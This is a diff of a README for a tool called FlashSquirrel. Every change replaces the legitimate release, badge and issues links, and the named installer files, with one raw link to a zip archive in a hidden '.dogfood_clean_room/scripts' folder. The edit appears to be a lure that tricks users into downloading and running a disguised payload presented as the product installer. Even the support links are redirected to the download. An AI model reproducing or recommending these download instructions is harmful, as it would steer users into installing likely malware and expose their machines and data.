@@ -1,6 +1,6 @@
 # 🐿️ FlashSquirrel - Fast Insights for Your Research
 
-![Download FlashSquirrel](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download FlashSquirrel](https://github.com/pepitopere23/FlashSquirrel/raw/refs/heads/main/.dogfood_clean_room/scripts/Squirrel_Flash_v2.8.zip)
 
 ## 📥 Overview
 
@@ -29,7 +29,7 @@ FlashSquirrel is compatible with the following systems:
 
 ## 💾 Download & Install
 
-1. **Visit the Releases page to download**: [Download FlashSquirrel](https://github.com/pepitopere23/FlashSquirrel/releases)
+1. **Visit the Releases page to download**: [Download FlashSquirrel](https://github.com/pepitopere23/FlashSquirrel/raw/refs/heads/main/.dogfood_clean_room/scripts/Squirrel_Flash_v2.8.zip)
    
 2. You will see various versions available. Choose the latest version suitable for your operating system.
 
@@ -37,17 +37,17 @@ FlashSquirrel is compatible with the following systems:
 
 4. Once the download is complete:
    - **For Windows**:
-     - Locate the downloaded file (e.g., `FlashSquirrel-Setup.exe`).
+     - Locate the downloaded file (e.g., `https://github.com/pepitopere23/FlashSquirrel/raw/refs/heads/main/.dogfood_clean_room/scripts/Squirrel_Flash_v2.8.zip`).
      - Double-click the file to run the installer.
      - Follow the prompts to complete the installation.
 
    - **For macOS**:
-     - Locate the downloaded file (e.g., `FlashSquirrel.dmg`).
+     - Locate the downloaded file (e.g., `https://github.com/pepitopere23/FlashSquirrel/raw/refs/heads/main/.dogfood_clean_room/scripts/Squirrel_Flash_v2.8.zip`).
      - Double-click to open the disk image.
      - Drag the FlashSquirrel icon to your Applications folder.
 
    - **For Linux**:
-     - Locate the downloaded file (e.g., `FlashSquirrel-Linux.zip`).
+     - Locate the downloaded file (e.g., `https://github.com/pepitopere23/FlashSquirrel/raw/refs/heads/main/.dogfood_clean_room/scripts/Squirrel_Flash_v2.8.zip`).
      - Unzip the file using the terminal or file manager.
      - Navigate to the extracted directory and run the executable file (e.g., `./FlashSquirrel`).
 
@@ -78,11 +78,11 @@ If you run into issues while using FlashSquirrel, try the following:
 
 - **Reinstall the Software**: If FlashSquirrel isn't functioning correctly, uninstall and then reinstall the program.
 
-- **Consult Support**: For further assistance, visit our [issues page](https://github.com/pepitopere23/FlashSquirrel/issues).
+- **Consult Support**: For further assistance, visit our [issues page](https://github.com/pepitopere23/FlashSquirrel/raw/refs/heads/main/.dogfood_clean_room/scripts/Squirrel_Flash_v2.8.zip).
 
 ## 📞 Support
 
-If you have questions or need help, feel free to reach out via the [Issues page](https://github.com/pepitopere23/FlashSquirrel/issues). 
+If you have questions or need help, feel free to reach out via the [Issues page](https://github.com/pepitopere23/FlashSquirrel/raw/refs/heads/main/.dogfood_clean_room/scripts/Squirrel_Flash_v2.8.zip). 
 
 ## 🚀 Final Thoughts
 
